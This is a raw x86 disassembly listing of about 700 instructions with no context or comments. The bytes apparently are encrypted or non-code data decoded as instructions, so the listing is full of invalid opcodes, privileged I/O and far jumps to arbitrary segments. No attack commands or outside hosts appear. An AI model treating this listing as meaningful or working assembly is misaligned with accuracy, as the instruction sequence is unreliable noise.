  4136c3:	lahf   
  4136c4:	cld    
  4136c5:	gs pusha 
  4136c7:	lods   al,BYTE PTR ds:[esi]
  4136c8:	and    BYTE PTR [edi+ebp*4],bh
  4136cb:	je     0x4136c9
  4136cd:	add    eax,ebx
  4136cf:	push   eax
  4136d0:	(bad)
  4136d3:	cwde   
  4136d4:	repz addr16 dec ebp
  4136d7:	rcl    DWORD PTR [edx-0x47],1
  4136da:	arpl   WORD PTR [edi+esi*4],si
  4136dd:	adc    al,0xc7
  4136df:	ins    BYTE PTR es:[edi],dx
  4136e0:	pop    ebx
  4136e1:	sub    dh,BYTE PTR [eax-0x3c1b7a2]
  4136e7:	pop    es
  4136e8:	add    DWORD PTR [eax+0x76],edi
  4136eb:	cli    
  4136ec:	mov    dh,0x24
  4136ee:	or     DWORD PTR [edx-0x76136b5c],eax
  4136f4:	mov    edi,0xc7e0ab8f
  4136f9:	enter  0xcf1c,0xe2
  4136fd:	sbb    BYTE PTR [eax+0x26],dl
  413700:	pop    ebp
  413701:	leave  
  413702:	pop    ebp
  413703:	cwde   
  413704:	test   BYTE PTR [edx],al
  413706:	fistp  QWORD PTR [ebx-0x6e7841bc]
  41370c:	and    al,0x7b
  41370e:	jmp    0x41374e
  413710:	fwait
  413711:	pop    ds
  413712:	scas   al,BYTE PTR es:[edi]
  413713:	xchg   edi,eax
  413714:	mov    ah,0x1
  413716:	and    al,0xdc
  413718:	pop    ebp
  413719:	pushf  
  41371a:	mov    edx,0x88452301
  41371f:	xchg   edx,eax
  413720:	mov    eax,ds:0x53ac542b
  413725:	dec    edx
  413726:	je     0x413744
  413728:	int3   
  413729:	pop    bx
  41372b:	adc    DWORD PTR [ebx+0x10],esp
  41372e:	xor    eax,0xc46061e2
  413733:	lahf   
  413734:	mov    bh,ah
  413736:	lods   eax,DWORD PTR ds:[esi]
  413737:	dec    edi
  413738:	xor    DWORD PTR [edx-0x7f],ebx
  41373b:	cmp    ebx,DWORD PTR [ecx+0x74]
  41373e:	outs   dx,BYTE PTR ds:[esi]
  41373f:	mov    ch,BYTE PTR [esp+ebx*2+0x4beb5ae2]
  413746:	loopne 0x413736
  413748:	mov    bl,0x9d
  41374a:	pop    ds
  41374b:	push   esp
  41374c:	add    DWORD PTR [esi+0x2],ebp
  41374f:	mov    ebp,0x41deb2b4
  413754:	pop    ebx
  413755:	lds    ebp,FWORD PTR [ebp+0x16]
  413758:	jno    0x413774
  41375a:	lods   eax,DWORD PTR ds:[esi]
  41375b:	jne    0x4137d1
  41375d:	sub    BYTE PTR [ebp-0x34d2341b],0x39
  413764:	lock sbb DWORD PTR [eax-0x42],ebx
  413768:	int3   
  413769:	jbe    0x413709
  41376b:	pop    ebp
  41376c:	ja     0x41376b
  41376e:	test   DWORD PTR [ecx],ebx
  413770:	mov    edi,0x2975d2e6
  413775:	push   cs
  413776:	rcr    DWORD PTR [ebx],0xc1
  413779:	mov    eax,0x5027b2b4
  41377e:	mov    bl,0x8b
  413780:	xor    ch,BYTE PTR ds:0x3718e6f6
  413786:	cmp    DWORD PTR [ebp+0x40],edx
  413789:	and    eax,0xc4e6aaff
  41378e:	xor    DWORD PTR [edx],esi
  413790:	subps  xmm4,XMMWORD PTR [ecx-0x74]
  413794:	mov    ch,0xfd
  413796:	int3   
  413797:	(bad)  
  413799:	in     al,0x8c
  41379b:	xchg   cl,cl
  41379d:	adc    ch,bl
  41379f:	adc    ebp,DWORD PTR [ecx]
  4137a1:	or     eax,0x3a08df6c
  4137a6:	dec    edx
  4137a7:	mov    ebp,0x8f61bb3f
  4137ac:	ret    
  4137ad:	xchg   esp,eax
  4137ae:	cdq    
  4137af:	les    esp,FWORD PTR [ecx+0x3cf0831c]
  4137b5:	jp     0x4137c0
  4137b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b8:	jge    0x413753
  4137ba:	adc    DWORD PTR [ebp-0x55],esi
  4137bd:	or     al,0xdc
  4137bf:	xchg   BYTE PTR [ebp+0x353bb171],al
  4137c5:	loopne 0x413840
  4137c7:	and    eax,0x9b820b1e
  4137cc:	in     al,dx
  4137cd:	clc    
  4137ce:	pushf  
  4137cf:	pop    edx
  4137d0:	push   0xd74d0f60
  4137d5:	cdq    
  4137d6:	mov    eax,0x5e04f95d
  4137db:	jge    0x4137b2
  4137dd:	xor    DWORD PTR [ecx+0x1438a883],eax
  4137e3:	out    0xd8,al
  4137e5:	lock repz push ebp
  4137e8:	into   
  4137e9:	and    edx,DWORD PTR [ebx]
  4137eb:	push   cs
  4137ec:	in     eax,dx
  4137ed:	(bad)  
  4137ee:	fild   QWORD PTR [edi+0x71e0d963]
  4137f4:	out    0xc7,eax
  4137f6:	pop    edx
  4137f7:	(bad)  [edx]
  4137f9:	stc    
  4137fa:	jecxz  0x4137aa
  4137fc:	pop    ds
  4137fd:	xchg   edi,eax
  4137fe:	ins    BYTE PTR es:[edi],dx
  4137ff:	cmp    esp,ebp
  413801:	int    0x4b
  413803:	sub    edi,DWORD PTR [edi-0x25]
  413806:	sahf   
  413807:	js     0x4137c7
  413809:	out    dx,eax
  41380a:	sbb    DWORD PTR [edi+ecx*2+0xb],esp
  41380e:	and    eax,0xb00a17c2
  413813:	adc    ebx,esi
  413815:	mov    ds:0xb17d6606,al
  41381a:	jg     0x41381d
  41381c:	xchg   edi,eax
  41381d:	adc    al,dl
  41381f:	jbe    0x4137e3
  413821:	cli    
  413822:	push   ecx
  413823:	scas   eax,DWORD PTR es:[edi]
  413824:	cld    
  413825:	pusha  
  413826:	xor    eax,0x394b45a5
  41382b:	xchg   ebx,eax
  41382c:	mov    bl,0xf8
  41382e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382f:	xor    BYTE PTR [ebx+edi*1-0x67682035],al
  413836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413837:	xor    edi,DWORD PTR [ebp-0x60]
  41383a:	or     DWORD PTR [eax+ebp*4+0x25],ebx
  41383e:	and    edi,DWORD PTR [ebp-0x29]
  413841:	sub    eax,0xd7611116
  413846:	popa   
  413847:	iret   
  413848:	push   esi
  413849:	cmp    ebx,edi
  41384b:	pop    esp
  41384c:	lock xchg edx,eax
  41384e:	fwait
  41384f:	test   BYTE PTR ds:0x2a790e00,cl
  413855:	aaa    
  413856:	adc    bl,BYTE PTR [ecx+0x7c396a3b]
  41385c:	fs adc eax,0xfcc883b8
  413862:	rcr    BYTE PTR [eax],0x1e
  413865:	sbb    ch,BYTE PTR [edx-0x6e6f2d96]
  41386b:	inc    ecx
  41386c:	jmp    0x19ff:0xf2bc6de8
  413873:	mov    WORD PTR [ecx+0x219e4911],fs
  413879:	pusha  
  41387a:	sbb    eax,0x152d6ba6
  41387f:	cs popa 
  413881:	call   0x724d:0x1cb8d7bd
  413888:	outs   dx,BYTE PTR ds:[esi]
  413889:	(bad)  
  41388a:	mov    esp,0xeeda95d5
  41388f:	fstp   TBYTE PTR [ebp-0x1c]
  413892:	pop    ecx
  413893:	add    DWORD PTR [ecx+0x74900d08],edi
  413899:	dec    edi
  41389a:	js     0x413912
  41389c:	sahf   
  41389d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41389e:	mov    edx,0xf26c8e89
  4138a3:	jmp    0x41387a
  4138a5:	fbstp  TBYTE PTR [eax-0x25]
  4138a8:	mov    esp,0x39abbd6e
  4138ad:	pop    ss
  4138ae:	cmp    ah,BYTE PTR [eax-0x71a12963]
  4138b4:	push   ecx
  4138b5:	pushf  
  4138b6:	xor    eax,0x1c18d654
  4138bb:	or     DWORD PTR [edx-0x52cf6da7],ecx
  4138c1:	inc    ecx
  4138c2:	(bad)  
  4138c3:	cwde   
  4138c4:	(bad)
  4138c8:	addr16 out dx,al
  4138ca:	iret   
  4138cb:	jb     0x413861
  4138cd:	jno    0x41386c
  4138cf:	inc    edx
  4138d0:	dec    ebx
  4138d1:	hlt    
  4138d2:	jnp    0x413863
  4138d4:	fsin   
  4138d6:	pushf  
  4138d7:	dec    ecx
  4138d8:	pop    edi
  4138d9:	hlt    
  4138da:	jbe    0x4138e0
  4138dc:	push   ds
  4138dd:	adc    eax,0x8cea8d12
  4138e2:	lahf   
  4138e3:	lock add al,0xf8
  4138e6:	adc    BYTE PTR [edx-0x6b],al
  4138e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ea:	mov    esi,0xcef1d978
  4138ef:	das    
  4138f0:	adc    bh,al
  4138f2:	fistp  WORD PTR [ebx+0x52]
  4138f5:	add    BYTE PTR [ebx-0x52],bl
  4138f8:	dec    esi
  4138f9:	adc    eax,0xc0799db9
  4138fe:	jmp    0xd056:0xcbb91aa
  413905:	ins    BYTE PTR es:[edi],dx
  413906:	outs   dx,BYTE PTR ds:[esi]
  413907:	sti    
  413908:	mov    esp,0xb6a9e27a
  41390d:	ins    DWORD PTR es:[edi],dx
  41390e:	push   0xffffff86
  413910:	pop    ebp
  413911:	cwde   
  413912:	xchg   ebp,eax
  413913:	add    DWORD PTR [edx],0x1739292
  413919:	cmp    eax,0xf1a7f814
  41391e:	pop    esi
  41391f:	fstp   QWORD PTR ds:0x262b4dea
  413925:	pop    edx
  413926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413927:	xor    BYTE PTR [ebx+0x41021b1f],cl
  41392d:	ins    BYTE PTR es:[edi],dx
  41392e:	(bad)  
  413930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413931:	nop
  413932:	iret   
  413933:	aad    0xf6
  413935:	in     eax,0xe3
  413937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413938:	dec    ecx
  413939:	jg     0x4138dd
  41393b:	or     cl,BYTE PTR [edi-0x6c]
  41393e:	inc    ecx
  41393f:	jo     0x4139a0
  413941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413942:	jmp    0x8c88f247
  413947:	jns    0x41392b
  413949:	jg     0x413979
  41394b:	pop    es
  41394c:	xor    eax,0x87e4f765
  413951:	cmc    
  413952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413953:	test   al,0x10
  413955:	hlt    
  413956:	push   esi
  413957:	mov    edi,0xc405afba
  41395c:	cwde   
  41395d:	cmp    al,0x7b
  41395f:	pop    ebp
  413960:	jge    0x413934
  413962:	je     0x413975
  413964:	int    0xbe
  413966:	pop    ebp
  413967:	xchg   esp,eax
  413968:	mov    BYTE PTR [ecx],dh
  41396a:	add    esi,DWORD PTR [eax+eiz*1-0x57]
  41396e:	jb     0x413929
  413970:	lds    ebx,FWORD PTR [esp+edi*4-0x6c]
  413974:	clc    
  413975:	sbb    ecx,ecx
  413977:	and    eax,0xa5136335
  41397c:	adc    eax,0x76531de2
  413981:	jbe    0x4139f6
  413983:	sub    bl,BYTE PTR [ecx+eiz*1-0x4b1d409d]
  41398a:	add    al,0x8a
  41398c:	mov    eax,ds:0xf8914f8c
  413991:	dec    ecx
  413992:	xchg   edi,eax
  413993:	lds    ecx,FWORD PTR [esi-0x45]
  413996:	(bad)  
  413997:	stos   DWORD PTR es:[edi],eax
  413998:	repz pop es
  41399a:	and    BYTE PTR [edx+0x754cf11a],bl
  4139a0:	sub    eax,0x9265f294
  4139a5:	mov    ebp,0x1f290320
  4139aa:	rol    eax,1
  4139ac:	add    BYTE PTR [eax+0x43],ch
  4139af:	xor    eax,0x7faa9c1a
  4139b4:	mov    ecx,0x8a0a02f9
  4139b9:	retf   
  4139ba:	jge    0x413973
  4139bc:	nop
  4139bd:	imul   edx,ebp,0x1e03ccd2
  4139c3:	xchg   ebp,eax
  4139c4:	xor    BYTE PTR [ecx+0x2c],dl
  4139c7:	sbb    BYTE PTR [eax-0x58],ch
  4139ca:	push   ds
  4139cb:	cmp    DWORD PTR [ebx-0x65f85d2],esp
  4139d1:	loop   0x4139b0
  4139d3:	aam    0xc8
  4139d5:	dec    edi
  4139d6:	and    eax,0x3a3d3825
  4139db:	shl    esp,1
  4139dd:	ins    DWORD PTR es:[edi],dx
  4139de:	xor    eax,0xab984a26
  4139e3:	mov    ebx,0xd17236a0
  4139e8:	add    eax,0xf0a77d27
  4139ed:	or     DWORD PTR [ecx-0x3f575b84],edi
  4139f3:	out    dx,al
  4139f4:	dec    ecx
  4139f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f6:	inc    esi
  4139f7:	mov    dh,0xc
  4139f9:	adc    ah,dl
  4139fb:	ins    BYTE PTR es:[edi],dx
  4139fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139fd:	dec    ebx
  4139fe:	cmp    al,dl
  413a00:	mov    ecx,0x3af5887
  413a05:	xchg   edi,eax
  413a06:	push   esp
  413a07:	repz fnstsw WORD PTR [ebp+0xafcc31e]
  413a0e:	pop    ebx
  413a0f:	aad    0x21
  413a11:	xor    eax,0x865f57bf
  413a16:	cmp    al,0x87
  413a18:	jbe    0x5ed03480
  413a1e:	call   0x61df:0x40eb6802
  413a25:	outs   dx,DWORD PTR ds:[esi]
  413a26:	jmp    0x413e016c
  413a2b:	xor    ah,BYTE PTR [esi]
  413a2d:	lea    esp,[ecx]
  413a2f:	jno    0x4139dc
  413a31:	and    BYTE PTR [ecx+0x76],dl
  413a34:	imul   ebp,DWORD PTR [ebx+edx*4+0x2455a7b9],0xffffffea
  413a3c:	jmp    0xff04:0xa9c6dace
  413a43:	push   esi
  413a44:	call   0x5c67a636
  413a49:	push   ebx
  413a4a:	pop    ebp
  413a4b:	sbb    esi,DWORD PTR [eax]
  413a4d:	in     al,0x5a
  413a4f:	mov    ah,BYTE PTR [eax+0x986cce4]
  413a55:	mov    esp,0x5f48f071
  413a5a:	adc    dh,cl
  413a5c:	daa    
  413a5d:	ret    0xbc5
  413a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a61:	push   esp
  413a62:	inc    esp
  413a63:	cmp    ebx,DWORD PTR [ebx-0x217f2747]
  413a69:	push   esp
  413a6a:	in     eax,0x73
  413a6c:	cs addr16 xchg esp,eax
  413a6f:	dec    eax
  413a70:	lods   al,BYTE PTR ds:[esi]
  413a71:	test   eax,0x1b3f5a33
  413a76:	inc    edx
  413a77:	xor    DWORD PTR [esi],ecx
  413a79:	ja     0x413a19
  413a7b:	iret   
  413a7c:	ds aaa 
  413a7e:	arpl   WORD PTR [ebx-0x590f0e12],dx
  413a84:	enter  0xc0ac,0x87
  413a88:	scas   al,BYTE PTR es:[edi]
  413a89:	icebp  
  413a8a:	lods   eax,DWORD PTR ds:[esi]
  413a8b:	dec    esi
  413a8c:	cmp    bh,0x37
  413a8f:	push   ss
  413a90:	aas    
  413a91:	(bad)  
  413a93:	sbb    bl,BYTE PTR [esi-0x3ec34192]
  413a99:	pop    ds
  413a9a:	mov    esi,0xf3401d0e
  413a9f:	je     0x413adf
  413aa1:	pop    eax
  413aa2:	mov    ds:0x9bd26ec3,al
  413aa7:	call   0xc6fd:0xc2b4d894
  413aae:	xchg   esp,eax
  413aaf:	mov    DWORD PTR [edi+0x37],edx
  413ab2:	push   ebp
  413ab3:	mov    edi,fs
  413ab5:	ret    
  413ab6:	mov    bl,0x48
  413ab8:	pop    esi
  413ab9:	mov    ebx,DWORD PTR [edi-0x6d]
  413abc:	jo     0x413a50
  413abe:	sub    DWORD PTR [ecx+eiz*1+0x55],esp
  413ac2:	xchg   edx,eax
  413ac3:	aas    
  413ac4:	lea    ebp,[edx]
  413ac6:	push   esp
  413ac7:	sub    BYTE PTR [edx+0x46639120],dh
  413acd:	lods   al,BYTE PTR ds:[esi]
  413ace:	pop    eax
  413acf:	(bad)  
  413ad0:	cmc    
  413ad1:	int    0x9b
  413ad3:	les    ebx,FWORD PTR [edx-0x2a]
  413ad6:	dec    edi
  413ad7:	ret    
  413ad8:	sbb    esi,DWORD PTR [eax]
  413ada:	cdq    
  413adb:	xor    BYTE PTR [esi+esi*4],bl
  413ade:	sar    BYTE PTR [ecx],0x9d
  413ae1:	mov    eax,0x184e80df
  413ae6:	mov    al,ds:0x986176e9
  413aeb:	stos   BYTE PTR es:[edi],al
  413aec:	jne    0x413aff
  413aee:	mov    ss,WORD PTR [ebx+ebp*2+0x7b56b3f8]
  413af5:	sbb    al,0xcf
  413af7:	idiv   esp
  413af9:	mov    esi,0xdef03dc9
  413afe:	mov    ah,0xa6
  413b00:	not    DWORD PTR [eax+0x1fb208c1]
  413b06:	addr16 loop 0x413b3d
  413b09:	lods   al,BYTE PTR ds:[esi]
  413b0a:	inc    edx
  413b0b:	sbb    al,0x80
  413b0d:	cmp    cl,BYTE PTR [edx+edx*4+0x42]
  413b11:	es test al,0x7c
  413b14:	fwait
  413b15:	xchg   edi,eax
  413b16:	mov    esi,0xf11d96cf
  413b1b:	mov    cs:0x5bd9b6b7,al
  413b21:	ror    BYTE PTR [esi-0x7d76f848],1
  413b27:	sbb    BYTE PTR [edi-0x5a],0x40
  413b2b:	sahf   
  413b2c:	lds    ebx,FWORD PTR [eax-0x90c797d]
  413b32:	icebp  
  413b33:	mov    ah,0xc5
  413b35:	ss xchg edi,eax
  413b37:	sbb    eax,0x8b127063
  413b3c:	dec    ebx
  413b3d:	lods   eax,DWORD PTR ds:[esi]
  413b3e:	cld    
  413b3f:	or     BYTE PTR [esi-0x64],bh
  413b42:	jg     0x413b85
  413b44:	mov    esp,0x1e429353
  413b49:	(bad)  
  413b4b:	cmp    BYTE PTR [ecx-0x47],0x22
  413b4f:	mov    ds:0x6a5e5d11,eax
  413b54:	inc    edi
  413b55:	pop    es
  413b56:	or     BYTE PTR [edi+0x29],ch
  413b59:	or     BYTE PTR [edx-0xbdef678],bl
  413b5f:	or     eax,0xbd72879f
  413b64:	mov    eax,ds:0x480325bf
  413b69:	sbb    eax,0xdd35f63a
  413b6e:	or     bl,BYTE PTR fs:[edx+0x4]
  413b72:	mov    es,ecx
  413b74:	daa    
  413b75:	mov    cl,0xb3
  413b77:	inc    DWORD PTR [ebp-0x5e]
  413b7a:	sub    dh,ah
  413b7c:	mov    cl,0x91
  413b7e:	mov    ds:0x5da1a939,al
  413b83:	jns    0x413be4
  413b85:	mov    ecx,edx
  413b87:	mov    ds:0xde1671c,al
  413b8c:	popf   
  413b8d:	out    0x49,eax
  413b8f:	(bad)  
  413b90:	cmp    DWORD PTR [edx+0x0],ecx
  413b93:	mov    eax,0xee0e919
  413b98:	xchg   edx,eax
  413b99:	inc    ecx
  413b9a:	push   0xa1f51e62
  413b9f:	sbb    al,0xde
  413ba1:	jp     0x413c03
  413ba3:	inc    ecx
  413ba4:	mov    esi,0xe22c7a11
  413ba9:	pop    edx
  413baa:	sub    eax,0x28cda205
  413baf:	retf   0xb927
  413bb2:	and    eax,0x36b70e3
  413bb7:	outs   dx,BYTE PTR ds:[esi]
  413bb8:	in     al,0x45
  413bba:	(bad)  
  413bbb:	enter  0x6455,0xbf
  413bbf:	repnz or eax,0x509604ee
  413bc5:	push   esi
  413bc6:	ins    BYTE PTR es:[edi],dx
  413bc7:	jecxz  0x413bd0
  413bc9:	fidivr DWORD PTR fs:[ebp+edi*4-0x78]
  413bce:	outs   dx,BYTE PTR ds:[esi]
  413bcf:	test   BYTE PTR [eax],0x1a
  413bd2:	aad    0xa
  413bd4:	jmp    0xb3ac:0x1c0f3495
  413bdb:	in     al,0x73
  413bdd:	std    
  413bde:	or     al,0xdb
  413be0:	jecxz  0x413c4e
  413be2:	jmp    0xfae7:0xe72c7357
  413be9:	xchg   ecx,eax
  413bea:	push   esi
  413beb:	adc    DWORD PTR [ecx+0x74],ebp
  413bee:	stc    
  413bef:	adc    eax,0x48cdd4e7
  413bf4:	out    0x96,eax
  413bf6:	pop    ebp
  413bf7:	jns    0x413c57
  413bf9:	popf   
  413bfa:	enter  0x8b9,0xbb
  413bfe:	and    bh,ah
  413c00:	(bad)  
  413c01:	in     eax,0x9a
  413c03:	pop    ebx
  413c04:	mov    bl,0x59
  413c06:	push   esp
  413c07:	js     0x413bdb
  413c09:	retf   
  413c0a:	xchg   ebx,eax
  413c0b:	xchg   ebp,eax
  413c0c:	and    BYTE PTR [eax+0x76d20d95],cl
  413c12:	dec    eax
  413c13:	ja     0x413bb9
  413c15:	mov    BYTE PTR [edx+0x38953189],al
  413c1b:	(bad)  
  413c1c:	pop    ss
  413c1d:	cwde   
  413c1e:	or     DWORD PTR [eax+0x7e3f80a],edx
  413c24:	mov    al,ds:0x5f544ca7
  413c29:	mov    dh,0xbf
  413c2b:	sbb    al,0x8a
  413c2d:	cs popa 
  413c2f:	jecxz  0x413c65
  413c31:	or     DWORD PTR [edx-0x2b47984e],0xe
  413c38:	xchg   ecx,ebx
  413c3a:	fstp   TBYTE PTR [ecx]
  413c3c:	xchg   ecx,eax
  413c3d:	push   eax
  413c3e:	pop    es
  413c3f:	cmp    al,0xd8
  413c41:	in     al,dx
  413c42:	mov    cl,cl
  413c44:	push   edx
  413c45:	mov    dl,0x7b
  413c47:	mov    al,0xe2
  413c49:	and    bl,BYTE PTR [edx+0x22bfaaa]
  413c4f:	clc    
  413c50:	imul   esi,DWORD PTR [ebp+0x38],0x7026f521
  413c57:	movntq QWORD PTR [edi],mm2
  413c5a:	or     bl,BYTE PTR [edx-0x4a]
  413c5d:	pop    ds
  413c5e:	mov    ds:0x97b8fb22,eax
  413c63:	push   esi
  413c64:	and    DWORD PTR [edi-0x75],edi
  413c67:	mov    al,ds:0x873a51d4
  413c6c:	sub    esi,ecx
  413c6e:	adc    eax,0xfeb7a2bf
  413c73:	std    
  413c74:	in     al,dx
  413c75:	and    ecx,DWORD PTR [eax-0x49849a62]
  413c7b:	adc    cl,BYTE PTR [esi-0x7e]
  413c7e:	pop    ecx
  413c7f:	xchg   ecx,eax
  413c80:	mov    esi,0xe9c2ca1a
  413c85:	in     al,0xa4
  413c87:	data16 stc 
  413c89:	cdq    
  413c8a:	or     DWORD PTR [esi-0x1c],0x2e
  413c8e:	jge    0x413c55
  413c90:	sbb    BYTE PTR [ecx-0x4743749f],0x72
  413c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c98:	cmp    DWORD PTR [ebp+esi*2+0x6f],ebp
  413c9c:	add    cl,BYTE PTR [esp+esi*2]
  413c9f:	call   0x78a6:0x1c93daec
  413ca6:	jae    0x413c46
  413ca8:	into   
  413ca9:	ror    DWORD PTR [edi+ebp*1+0x36a7fb3f],1
  413cb0:	cmc    
  413cb1:	mul    DWORD PTR [ebp+0x730fadf9]
  413cb7:	jne    0x413cf5
  413cb9:	xlat   BYTE PTR ds:[ebx]
  413cba:	xor    eax,0xb3f895f
  413cbf:	xchg   edx,eax
  413cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cc1:	adc    BYTE PTR [ebp-0x5a],0x7a
  413cc5:	pop    ebp
  413cc6:	adc    ebp,DWORD PTR [edx]
  413cc8:	dec    eax
  413cc9:	sbb    edx,0x560a5352
  413ccf:	pop    DWORD PTR [edx]
  413cd1:	daa    
  413cd2:	xor    eax,DWORD PTR [edx+0x64]
  413cd5:	mov    ah,0xcc
  413cd7:	out    0xc4,al
  413cd9:	or     dl,BYTE PTR [esi-0x46]
  413cdc:	test   DWORD PTR [esi],edi
  413cde:	scas   eax,DWORD PTR es:[edi]
  413cdf:	stos   BYTE PTR es:[edi],al
  413ce0:	imul   ebp,DWORD PTR [eax],0xffffffba
  413ce3:	jb     0x413c6c
  413ce5:	inc    ecx
  413ce6:	xchg   esp,eax
  413ce7:	pop    es
  413ce8:	(bad)  
  413ce9:	dec    ecx
  413cea:	aad    0xeb
  413cec:	loop   0x413c9f
  413cee:	push   DWORD PTR [edi+0x558152f]
  413cf4:	loopne 0x413c99
  413cf6:	dec    DWORD PTR [esi+edx*1-0x5a3e5da2]
  413cfd:	out    dx,al
  413cfe:	fimul  WORD PTR [edx-0xb5e6056]
  413d04:	push   es
  413d05:	add    DWORD PTR [ecx+0x3d],esi
  413d08:	jg     0x413cdf
  413d0a:	xor    DWORD PTR [eax],ebx
  413d0c:	or     BYTE PTR [ebp+0x47],0xb8
  413d10:	fcomp  DWORD PTR [ebp+0x22]
  413d13:	fucomip st,st(2)
  413d15:	cwde   
  413d16:	mov    ds:0xaabfcdc3,eax
  413d1b:	push   es
  413d1c:	mov    dl,0xd3
  413d1e:	lds    eax,FWORD PTR [ebp-0x53352c9d]
  413d24:	jnp    0x413d87
  413d26:	mov    ebp,0x22df4fd9
  413d2b:	jp     0x413ce5
  413d2d:	js     0x413d7d
  413d2f:	clc    
  413d30:	in     eax,0xbb
  413d32:	std    
  413d33:	inc    DWORD PTR [edx+0x1153bf4d]
  413d39:	je     0x413d24
  413d3b:	mov    edx,0x5f79afbd
  413d40:	aam    0xfb
  413d42:	mov    bl,0x3a
  413d44:	and    al,0x7d
  413d46:	lods   eax,DWORD PTR ds:[esi]
  413d47:	imul   BYTE PTR [esi+0x8]
  413d4a:	retf   
  413d4b:	jl     0x413ce8
  413d4d:	mov    dh,BYTE PTR [edx-0x14]
  413d50:	sub    al,ch
  413d52:	(bad)  
  413d53:	aad    0x9d
  413d55:	sbb    ebp,edx
  413d57:	and    edi,DWORD PTR [eax+0x1d3b726a]
  413d5d:	retf   0xc62c
  413d60:	inc    esi
  413d61:	imul   ecx,DWORD PTR [edi+0xa5f45a2],0xffffffcc
  413d68:	cli    
  413d69:	inc    esi
  413d6a:	data16 aas 
  413d6c:	sbb    eax,0x5ab912cf
  413d71:	sub    ch,BYTE PTR [ebp-0x47552767]
  413d77:	or     al,0x3b
  413d79:	clc    
  413d7a:	int3   
  413d7b:	or     ecx,DWORD PTR [eax+0x2d]
  413d7e:	dec    edx
  413d7f:	jg     0x413d20
  413d81:	lock add BYTE PTR [edx+edi*8+0x5a7fce0d],dl
  413d89:	mov    ds:0x3cd96ce5,eax
  413d8e:	or     DWORD PTR [edx+0x3a34aa08],ecx
  413d94:	mov    eax,0x4c5936f1
  413d99:	daa    
  413d9a:	das    
  413d9b:	repnz outs dx,DWORD PTR ds:[esi]
  413d9d:	and    DWORD PTR [eax],ebp
  413d9f:	out    dx,eax
  413da0:	int3   
  413da1:	icebp  
  413da2:	mov    bl,0xd3
  413da4:	ss inc esi
  413da6:	test   eax,0xdb4417df
  413dab:	push   edx
  413dac:	xchg   edx,eax
  413dad:	push   esi
  413dae:	sbb    BYTE PTR ds:0x34ec929d,ch
  413db4:	jne    0x413e11
  413db6:	or     DWORD PTR [ecx],edx
  413db8:	xchg   ebx,eax
  413db9:	push   eax
  413dba:	mov    ebp,0x236d7b43
  413dbf:	sbb    DWORD PTR [edi],ebp
  413dc1:	das    
  413dc2:	icebp  
  413dc3:	xlat   BYTE PTR ds:[ebx]
  413dc4:	jg     0x413dc7
  413dc6:	jmp    0x6f74c552
  413dcb:	and    ah,BYTE PTR [ecx]
  413dcd:	fbstp  TBYTE PTR [ebx]
  413dcf:	pop    ds
  413dd0:	cmp    BYTE PTR [esi+0x1e029bed],0x85
  413dd7:	mov    eax,ds:0x76529be
  413ddc:	lods   eax,DWORD PTR ds:[esi]
  413ddd:	popa   
  413dde:	popf   
  413ddf:	sub    BYTE PTR [ebx],ch
  413de1:	push   ebp
  413de2:	aad    0x30
  413de4:	mov    es,WORD PTR [ecx]
  413de6:	push   edx
  413de7:	mov    DWORD PTR [esi-0x10],edx
  413dea:	shr    DWORD PTR [esi-0x30],cl
  413ded:	std    
  413dee:	test   al,0x74
  413df0:	dec    ebp
  413df1:	int    0x48
  413df3:	mov    edx,0xe9890c26
  413df8:	scas   al,BYTE PTR es:[edi]
  413df9:	dec    cx
  413dfb:	jp     0x413dcb
  413dfd:	in     eax,dx
  413dfe:	sub    bl,BYTE PTR [ebx]
  413e00:	xchg   esi,eax
  413e01:	ja     0x413e1e
  413e03:	mov    bl,0x88
  413e05:	sub    bl,BYTE PTR [edx]
  413e07:	into   
  413e08:	xchg   BYTE PTR [eax-0x5a5c4748],cl
  413e0e:	out    0xbf,eax
  413e10:	test   BYTE PTR [ebx],ah
  413e12:	ds mov eax,0xce76a852
  413e18:	push   ds
  413e19:	push   0x1
  413e1b:	outs   dx,BYTE PTR ds:[esi]
  413e1c:	cli    
  413e1d:	jno    0x413e30
  413e1f:	sub    eax,0x47661fb8
  413e24:	aad    0x11
  413e26:	fcmovb st,st(5)
  413e28:	or     BYTE PTR ds:0x6445ef6d,ch
  413e2e:	jmp    0xca0a:0x4d549dc4
  413e35:	push   ds
  413e36:	rol    BYTE PTR [esi+0x1f747d80],1
  413e3c:	jl     0x413e0c
  413e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e3f:	in     al,0x1a
  413e41:	adc    edi,DWORD PTR [ebp-0x67]
  413e44:	(bad)  
  413e45:	mov    ebx,0x3ec56f96
  413e4a:	or     BYTE PTR [ebp+0x4b],dl
  413e4d:	mov    bl,0x78
  413e4f:	ins    DWORD PTR es:[edi],dx
  413e50:	out    0x94,eax
  413e52:	stc    
  413e53:	sti    
  413e54:	gs xchg edx,eax
  413e56:	shl    DWORD PTR [esi-0x79],0xf1
  413e5a:	adc    BYTE PTR [esi+0x5c],0xd9
  413e5e:	mov    al,ds:0xb218cd77
  413e63:	or     DWORD PTR [ecx+0x142c541d],edi
  413e69:	jbe    0x413df9
  413e6b:	inc    edx
  413e6c:	mov    esp,0x20188ea2
  413e71:	call   0xb5b3:0xbfb2c858
  413e78:	add    DWORD PTR [edi+0x5179ab98],esi
  413e7e:	cs rol bl,cl
  413e81:	add    DWORD PTR [ebx+0x3694eb6a],eax
  413e87:	jo     0x413e92
  413e89:	ret    0x6235
  413e8c:	lahf   
  413e8d:	inc    ebx
  413e8e:	lea    esp,[esi+edx*1]
  413e91:	xchg   ah,dl
  413e93:	and    eax,0xffffffc4
